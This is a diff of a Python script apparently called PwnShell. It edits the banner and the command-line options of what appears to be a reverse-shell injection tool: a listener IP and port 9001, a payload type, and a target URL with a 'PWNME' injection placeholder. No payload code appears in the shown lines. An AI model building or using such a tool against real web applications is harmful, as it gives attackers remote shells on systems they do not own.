@@ -18,7 +18,7 @@ banner = '''
 
      __    ____                _____ __         ____    __
    _/ /   / __ \_      ______ / ___// /_  ___  / / /  _/ /
-  / __/  / /_/ / | /| / / __ \\__ \/ __ \/ _ \/ / /  / __/
+  / __/  / /_/ / | /| / / __ \\__ \/ __ \ / _ \/ / /  / __/
  (_  )  / ____/| |/ |/ / / / /__/ / / / /  __/ / /  (_  ) 
 /  _/  /_/     |__/|__/_/ /_/____/_/ /_/\\___/_/_/  /  _/  
 /_/                                                /_/    
@@ -28,20 +28,18 @@ print(banner)
 
 def main():
 	global args , default_ip , nc , port , ip , domain , method ,data , authentication 
-	ip_address = netifaces.ifaddresses('tun0')[2][0]['addr']
+	ip_address = netifaces.ifaddresses('lo')[2][0]['addr']
 	################################# Arguments Crreation ###########################################
 	parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter)
 	parser.add_argument('-H','--host',help='LOCAL IP ADDRESS',default=ip_address)
 	parser.add_argument('-p','--port',help='LOCAL PORT NUMBER',type=int,default=9001)
 	parser.add_argument("-t","--type",help='Payload Type [windows/linux]',type=str,default='linux')
 	parser.add_argument("-u","--url",help='Target url [http://localhost:8888/h.php?meow=PWNME]')
+	parser.add_argument("-d","--data",help='Post data')
 	parser.add_argument("-c","--cookie",help='Enter Cookie')
 	parser.add_argument("-k","--header",help='Provide header')
 	parser.add_argument("-m","--method",help='Request Method',default='post')
-	parser.add_argument("-d","--data",help='Post data')
-	parser.add_argument("-a","--auth",help='Authentication', nargs=2)
-	#parser.add_argument("-U","--user",help='Username')
-	#parser.add_argument("-P","--passwd",help='Password')
+	parser.add_argument("-a","--auth",help='[USERNAME PASSWORD]', nargs=2)
 	args = parser.parse_args()
 	##################################################################################################
 	########################## Defining variables ##########################
@@ -52,8 +50,6 @@ def main():
 	method=args.method
 	data=args.data
 	authentication=args.auth
-	#user=args.user
-	#passwd=args.passwd
 	########################################################################
 	###################### Specifying OS ###################################
 	if args.type == "linux" or args.type == "l":
